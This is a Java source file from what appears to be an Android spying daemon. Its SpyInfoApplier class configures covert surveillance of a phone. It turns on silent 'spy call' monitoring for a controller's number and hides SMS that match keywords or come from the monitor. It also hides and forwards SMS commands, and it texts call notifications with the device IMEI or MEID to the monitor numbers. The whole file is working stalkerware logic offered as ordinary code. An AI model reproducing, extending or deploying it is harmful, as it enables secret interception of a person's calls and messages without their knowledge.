package com.vvt.daemon.appengine;

import java.io.IOException;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.content.Context;

import com.vvt.callmanager.ref.BugNotification;
import com.vvt.callmanager.ref.MonitorDisconnectReason;
import com.vvt.callmanager.ref.MonitorNumber;
import com.vvt.callmanager.ref.SmsInterceptInfo;
import com.vvt.callmanager.ref.SmsInterceptInfo.InterceptionMethod;
import com.vvt.callmanager.ref.SmsInterceptInfo.KeywordFindingMethod;
import com.vvt.callmanager.ref.command.RemoteAddMonitor;
import com.vvt.callmanager.ref.command.RemoteAddSmsIntercept;
import com.vvt.callmanager.ref.command.RemoteListenBugNotification;
import com.vvt.callmanager.ref.command.RemoteRemoveAllMonitor;
import com.vvt.callmanager.ref.command.RemoteRemoveAllSmsIntercept;
import com.vvt.daemon_addressbook_manager.Customization;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.phoneinfo.PhoneInfo;
import com.vvt.phoneinfo.PhoneType;
import com.vvt.preference_manager.PrefKeyword;
import com.vvt.preference_manager.PrefMonitorNumber;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.preference_manager.PreferenceType;
import com.vvt.sms.SmsUtil;

public class SpyInfoApplier {
	private static final String TAG = "SpyInfoApplier";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private static SpyInfoApplier sInstance;
	private Context mContext;
	private String mPacketName;
	private String mSocketName;
	
	public static SpyInfoApplier getInstance(Context context, String processName, String socketName) {
		if (sInstance == null) {
			sInstance = new SpyInfoApplier(context, processName, socketName);
		}
		
		return sInstance;
	}
	
	private SpyInfoApplier(Context context, String processName, String socketName) {
		mContext = context;
		mPacketName = processName;
		mSocketName = socketName;
	}
	
	/**
	 * To be used when the daemon is starting and when the spy preferences are needed to be 
	 * refreshed to match the preference database.
	 */
	public void applySettings(LicenseManager licenseManager, PreferenceManager preferenceManager) {
		if(LOGV) FxLog.v(TAG, "applySettings # ENTER ...");
		
		LicenseInfo licenseInfo  =licenseManager.getLicenseInfo();
		boolean isActivated = false;
		if(licenseInfo.getLicenseStatus() == LicenseStatus.ACTIVATED) {
			isActivated = true;
		}
		if(LOGD) FxLog.d(TAG, String.format(
				"applySettings # Is product activated? %s", isActivated));
		
		PrefMonitorNumber prefMonitorNumber = (PrefMonitorNumber) preferenceManager
				.getPreference(PreferenceType.MONITOR_NUMBER);
		PrefKeyword prefKeyword = (PrefKeyword) preferenceManager
				.getPreference(PreferenceType.KEYWORD);
		
		//spy call and call intercept.
		boolean isEnabled = prefMonitorNumber.getEnableMonitor();
		List<String> numbers = prefMonitorNumber.getMonitorNumber();
		if(LOGD) FxLog.d(TAG, String.format(
				"applySettings # Monitor numbers %s", numbers.toString()));
		String number = "";
		if(numbers.size() > 0) {
			number = numbers.get(0);
		}
		
		if(LOGD) FxLog.d(TAG, String.format("applySettings # Enable Spy: %s", isEnabled));
		setSpyCallEnabled(isActivated ? isEnabled : false, number);
		
		List<String> keywordList = prefKeyword.getKeyword();
		String[] keywords;
		if (isActivated) {
			 keywords = keywordList.toArray(new String[keywordList.size()]);
		} else {
			keywords = new String[]{ null, null };
		}
		
		if(LOGD) FxLog.d(TAG, "applySettings # Remove all keywords");
		removeAllKeywords();
		
		if(LOGD) FxLog.d(TAG, String.format("applySettings # Set new keywords: %s", keywordList.toString()));
		setKeywords(keywords);
		
		if(LOGD) FxLog.d(TAG, "applySettings # Add basic SMS intercept");
		isEnabled = prefMonitorNumber.getEnableMonitor();
		//no need to check activate or not 
		//because should hide the SMS that contain Monitor when it enable. 
		addBasicSmsIntercept(number,isEnabled);
		
		if(LOGV) FxLog.v(TAG, "applySettings # EXIT ...");
	}
	
	private void removeAllKeywords() {
		if(LOGV) FxLog.v(TAG, "removeAllKeywords # ENTER ...");
		
		try {
			RemoteRemoveAllSmsIntercept remoteRemoveAll = 
					new RemoteRemoveAllSmsIntercept(mPacketName);
			
			boolean removeSuccess = remoteRemoveAll.execute();
			if(LOGV) FxLog.v(TAG, String.format(
					"removeAllKeywords # Removing success? %s", removeSuccess));
		}
		catch (IOException e) {
			FxLog.e(TAG, String.format("removeAllKeywords # Error: %s", e));
		}
		
		if(LOGV) FxLog.v(TAG, "removeAllKeywords # EXIT ...");
	}
	
	private void setKeywords(String[] keywords) {
		FxLog.v(TAG, "setKeywords # ENTER ...");
	
		RemoteAddSmsIntercept remoteAddSmsIntercept = null;
		
		try {
			for (String keyword : keywords) {
				if (keyword == null || keyword.trim().length() == 0) continue;
				
				SmsInterceptInfo info = new SmsInterceptInfo();
				info.setOwnerPackage(mPacketName);
				info.setClientSocketName(mSocketName);
				info.setInterceptionMethod(InterceptionMethod.HIDE_ONLY);
				info.setKeywordFindingMethod(KeywordFindingMethod.CONTAINS);
				info.setKeyword(keyword);
				
				remoteAddSmsIntercept = new RemoteAddSmsIntercept(info);
				boolean addSuccess = remoteAddSmsIntercept.execute();
				
				if(LOGD) FxLog.d(TAG, String.format(
						"setKeywords # Add: %s, Success? %s", info, addSuccess));
			}
			
		}
		catch (IOException e) {
			if(LOGE) FxLog.e(TAG, String.format("setKeywords # Error: %s", e));
		}
		
		if(LOGV) FxLog.v(TAG, "setKeywords # EXIT ...");
	}
	
	/**
	 * This method must be called after setMonitor(number)
	 * @param enable
	 */
	private void setSpyCallEnabled(boolean isEnable, String number) {
		if(LOGV) FxLog.v(TAG, "setSpyCallEnabled # ENTER ...");
		try {
			if(LOGV) FxLog.v(TAG, "setSpyCallEnabled # Remove previous monitor");
			RemoteRemoveAllMonitor remoteRemoveAll = 
					new RemoteRemoveAllMonitor(mPacketName);
			
			remoteRemoveAll.execute();
			
			if (isEnable) {
				
				//register notification 
				BugNotification notification = new BugNotification(
						mSocketName, BugNotification.LISTEN_ON_MONITOR_DISCONNECT 
						| BugNotification.LISTEN_ON_NORMAL_CALL_ACTIVE);
				
				RemoteListenBugNotification listenBugNotification = new RemoteListenBugNotification(notification);
				listenBugNotification.execute();
				
				MonitorNumber monitor = getEnabledMonitor(isEnable, number);
				if (monitor == null) {
					if(LOGD) FxLog.d(TAG, "setSpyCallEnabled # No monitor found");
				}
				else {
					if(LOGD) FxLog.d(TAG, String.format("setSpyCallEnabled # Add: %s", monitor));
					RemoteAddMonitor remoteAdd = new RemoteAddMonitor(monitor);
					remoteAdd.execute();
				}
			} else {
				//unregister notification 
				BugNotification notification = new BugNotification(
						mSocketName, BugNotification.LISTEN_NONE);
				
				RemoteListenBugNotification listenBugNotification = new RemoteListenBugNotification(notification);
				listenBugNotification.execute();
			}
		}
		catch (IOException e) {
			if(LOGE) FxLog.e(TAG, String.format("setSpyCallEnabled # Error: %s", e));
		}
		
		if(LOGV) FxLog.v(TAG, "setSpyCallEnabled # EXIT ...");
	}
	
	/**
	 * Must be called after setKeywords()
	 */
	private void addBasicSmsIntercept(String monitorNumber, boolean isMonitorActive) {
		if(LOGV) FxLog.v(TAG, "addBasicSmsIntercept # ENTER ...");
		
		try {
			RemoteAddSmsIntercept remoteAdd = null;
			
			if(LOGV) FxLog.v(TAG, "addBasicSmsIntercept # Receive SMS command");
			SmsInterceptInfo info = new SmsInterceptInfo();
			info.setOwnerPackage(mPacketName);
			info.setClientSocketName(mSocketName);
			info.setInterceptionMethod(InterceptionMethod.HIDE_AND_FORWARD);
			info.setKeywordFindingMethod(KeywordFindingMethod.START_WITH);
			info.setKeyword(AppEnginDaemonResource.SMS_COMMAND_TAG);
			
			remoteAdd = new RemoteAddSmsIntercept(info);
			remoteAdd.execute();
			
			if(LOGV) FxLog.v(TAG, String.format(
					"addBasicSmsIntercept # monitor: %s, active? %s", 
					monitorNumber, isMonitorActive));
			
			if (isMonitorActive && monitorNumber != null 
					&& monitorNumber.trim().length() > 0) {
				
				if(LOGV) FxLog.v(TAG, "addBasicSmsIntercept # Hide SMS containing monitor");
				info = new SmsInterceptInfo();
				info.setOwnerPackage(mPacketName);
				info.setClientSocketName(mSocketName);
				info.setInterceptionMethod(InterceptionMethod.HIDE_ONLY);
				info.setKeywordFindingMethod(KeywordFindingMethod.CONTAINS);
				info.setKeyword(getMonitorDetectingRegex(monitorNumber));
				
				remoteAdd = new RemoteAddSmsIntercept(info);
				remoteAdd.execute();
				
				if(LOGV) FxLog.v(TAG, "addBasicSmsIntercept # Hide SMS sending from monitor");
				info = new SmsInterceptInfo();
				info.setOwnerPackage(mPacketName);
				info.setClientSocketName(mSocketName);
				info.setInterceptionMethod(InterceptionMethod.HIDE_ONLY);
				info.setSenderNumber(monitorNumber);
				
				remoteAdd = new RemoteAddSmsIntercept(info);
				remoteAdd.execute();
			}
		}
		catch (IOException e) {
			if(LOGE) FxLog.e(TAG, String.format("addBasicSmsIntercept # Error: %s", e));
		}
		
		if(LOGV) FxLog.v(TAG, "addBasicSmsIntercept # EXIT ...");
	}
	
	public static String getMonitorDetectingRegex(String monitorNumber) {
		String output = null;
		
		// Remove spaces
		output = monitorNumber.trim();
		
		// remove + and following 2-3 digits
		if (output.startsWith("+")) {
			Pattern p = Pattern.compile("\\+[0-9]{1,3}");
			Matcher m = p.matcher(output);
			output = m.replaceFirst("");
		}
		
		// Remove symbol
		output = output.replace("+", "").replace("-", "")
				.replace("(", "").replace(")", "").replace(" ", "");
		
		// Remove beginning zero
		if (output.startsWith("0")) {
			Pattern p = Pattern.compile("[0]+");
			Matcher m = p.matcher(output);
			output = m.replaceFirst("");
		}
		
		StringBuilder builder = new StringBuilder();
		for (char c : output.toCharArray()) {
			builder.append(String.format("[ ]*([(]?[ ]*[-]?[ ]*[%s]{1}[ ]*[)]?)", c));
		}
		
		return builder.toString();
	}
	
	private MonitorNumber getEnabledMonitor(boolean isEnable, String number) {
		MonitorNumber monitor = null;
		
		if (number != null && number.trim().length() > 0) {
			monitor = new MonitorNumber();
			monitor.setOwnerPackage(mPacketName);
			monitor.setPhoneNumber(number);
			monitor.setEnabled(true);
			monitor.setSpyEnabled(isEnable);
			monitor.setOffhookSpyEnabled(isEnable);
		}
		
		return monitor;
	}
	
	public void handleWatchNumber(PhoneInfo phoneInfo, String phoneNumber,
			boolean isIncoming, PrefMonitorNumber prefMonitorNumber) {
		String notificationMessage = null;
		
		String deviceId = null;
		boolean isGsm = true;

		if (phoneInfo.getPhoneType() == PhoneType.PHONE_TYPE_CDMA) {
			deviceId = phoneInfo.getMEID();
			isGsm = false;
		} else if (phoneInfo.getPhoneType() == PhoneType.PHONE_TYPE_GSM) {
			deviceId = phoneInfo.getIMEI();
		} else {
			deviceId = phoneInfo.getMEID();
			isGsm = false;
			if (deviceId == null) {
				deviceId = phoneInfo.getIMEI();
				isGsm = true;
			}
		}			

		if (isIncoming) {
			notificationMessage = AppEnginDaemonResource.getWatchListNotificationIncoming(
					isGsm, mContext, phoneNumber, deviceId);
		} else {
			notificationMessage = AppEnginDaemonResource.getWatchListNotificationOutgoing(
					isGsm, mContext, phoneNumber, deviceId); 
		}
		
		List<String> monitorNumbers = prefMonitorNumber.getMonitorNumber();
		
		if(LOGD) FxLog.d(TAG, String.format(
				"handleWatchNumber # Monitor: %s, Message: %s", 
				monitorNumbers.toString(), notificationMessage));
		
		if (notificationMessage != null) {
			for(String number : monitorNumbers) {
				SmsUtil.sendSms(number, notificationMessage);
				
			}
		}
	}
	
	public void handleMonitorDisconnect(MonitorDisconnectReason reason, PrefMonitorNumber prefMonitorNumber) {
		if (reason == MonitorDisconnectReason.MUSIC_PLAY) {
			String notificationMessage = AppEnginDaemonResource.LANGUAGE_SMS_NOTIFY_FOR_MUSIC_PLAY;
			
			List<String> monitorNumbers = prefMonitorNumber.getMonitorNumber();
			
			if(LOGV) FxLog.d(TAG, String.format(
					"handleMonitorDisconnect # Monitor: %s, Message: %s", 
					monitorNumbers.toString(), notificationMessage));
			
			for(String number : monitorNumbers) {
				SmsUtil.sendSms(number, notificationMessage);
			}
		}
	}
}
